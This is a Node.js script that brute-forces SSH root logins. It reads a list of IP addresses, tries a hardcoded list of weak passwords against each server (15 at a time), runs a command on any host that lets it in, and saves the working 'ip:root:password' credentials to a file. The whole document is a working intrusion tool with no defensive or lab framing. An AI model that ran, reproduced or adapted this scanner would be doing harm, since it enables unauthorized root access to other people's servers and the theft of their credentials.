const fs = require('fs');
const { Client } = require('ssh2');
const async = require('async');

const file = 'mfu.txt';
const passwords = ['root', 'admin', '12345', '123456', 'qwerty', 'admin123', 'root123', 'adminadmin', 'qazxsw123'];

function writeGoodEntry(entry) {
fs.appendFileSync('good.txt', entry + '\n', 'utf-8');
}

fs.promises.readFile(file, 'utf-8')
.then(async (data) => {
const servers = data.trim().split('\n');
await async.eachLimit(servers, 15, async (ip) => {
for (const password of passwords) {
const conn = new Client();

    conn.on('ready', () => {
      //console.log(`Connected to ${ip}`);
      conn.exec('echo "Ping from SSH" | ping google.com', (err, stream) => {
        if (err) {
          //console.error(`Error executing command on ${ip}: ${err.message}`);
          conn.end();
          return;
        }
        let stdout = '';
        let stderr = '';
        stream.on('close', (code, signal) => {
          conn.end();
          if (code === 0) {
            console.log(`${ip}:root:${password}`);
            //console.log(`${ip} command execution successful`);
            const goodEntry = `${ip}:root:${password}`;
            //console.log(goodEntry);
            writeGoodEntry(goodEntry);
            //console.log(`TCP Ping output for ${ip}: ${stdout}`);
          } else {
            //console.error(`Command execution failed on ${ip}, exit code: ${code}`);
            //console.error(`Error output for ${ip}: ${stderr}`);
          }
        }).on('data', (data) => {
          stdout += data;
        }).on('error', (err) => {
          //console.error(`Error occurred on ${ip}: ${err}`);
            process.exit(); 
        }).stderr.on('data', (data) => {
          stderr += data;
        });
      });
    }).on('error', (err) => {
      //console.error(`Error connecting to ${ip}: ${err.message}`);
    }).connect({
      host: ip,
      port: 22,
      username: 'root',
      password: password
    });

    await delay(200); // Delay for 100 milliseconds
  }
});
})
.catch((err) => {
console.error("Error reading file:", err);
});

function delay(ms) {
return new Promise((resolve) => {
setTimeout(resolve, ms);
});
}